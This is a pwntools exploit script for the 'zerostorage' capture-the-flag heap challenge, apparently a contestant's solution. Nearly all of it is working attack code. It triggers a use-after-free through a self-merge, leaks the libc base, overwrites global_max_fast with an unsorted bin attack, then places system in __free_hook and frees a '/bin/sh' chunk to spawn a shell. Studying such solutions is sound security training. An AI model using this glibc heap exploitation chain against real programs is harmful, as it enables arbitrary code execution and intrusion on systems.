from pwn import *

# init
os.environ['LD_PRELOAD'] = '/home/dumbass/Desktop/Problem/zerostorage/libc-2.19.so'
r = process('./zerostorage')
e = ELF('./zerostorage')
libc = e.libc
context.arch = 'amd64'
#context.log_level = 'debug'


def insert(content):
    r.sendlineafter('Your choice: ', '1')
    r.sendlineafter('Length of new entry: ', str(len(content)))
    r.sendafter('Enter your data: ', content)
def update(index, content):
    r.sendlineafter('Your choice: ', '2')
    r.sendlineafter('Entry ID: ', str(index))
    r.sendlineafter('Length of entry: ', str(len(content)))
    r.sendafter('Enter your data: ', content)
def merge(fromid, toid):
    r.sendlineafter('Your choice: ', '3')
    r.sendlineafter('Merge from Entry ID: ', str(fromid))
    r.sendlineafter('Merge to Entry ID: ', str(toid))
def delete(index):
    r.sendlineafter('Your choice: ', '4')
    r.sendlineafter('Entry ID: ', str(index))
def view(index):
    r.sendlineafter('Your choice: ', '5')
    r.sendlineafter('Entry ID: ', str(index))
def list_c():
    r.sendlineafter('Your choice: ', '6')

# create tow entries to enable merge
insert('/bin/sh\x00'+'A'*(0x1f0-8))
insert('A'*0x1f0)

# merge id1 itself to make id1 id2 point to the same addr
merge(1, 1)
# padding to avoid consolidation
insert('A'*0x1f0)
insert('A'*0x1f0)

# cause use after free and heap overflow then leak libc
delete(1)
view(2)
r.recvuntil('Entry No.2:\n')
sbin = u64(r.recv(6)+'\x00\x00')
libc_base = sbin - libc.symbols['__malloc_hook'] - 0x68
log.info('libc base: %#x' % libc_base)
system = libc_base + libc.symbols['system']
__malloc_hook = libc_base + libc.symbols['__malloc_hook']
__free_hook = libc_base + libc.symbols['__free_hook']
global_max_fast = __free_hook + 0x50
log.info('global_max_fast: %#x' % global_max_fast)

# overwrite global_max_fast by unsorted bin attack
insert('A'*0x1f0)
insert('A'*0x200)#padding
delete(3)
update(2, 'A'*0x1f0+p64(0)+p64(0x201)+p64(__malloc_hook+0x68)+p64(global_max_fast-0x10)+'A'*0x1d0)
insert('A'*0x1f0)

# exploit
delete(3)
update(2, 'A'*0x1f0+p64(0)+p64(0x201)+p64(__free_hook-0x50-9)+p64(0)+'A'*0x1d0)
insert('A'*0x1f0)
insert('\x00'*(0x50-7)+p64(system)+'\x00'*(0x198+7))
delete(0)

r.interactive()
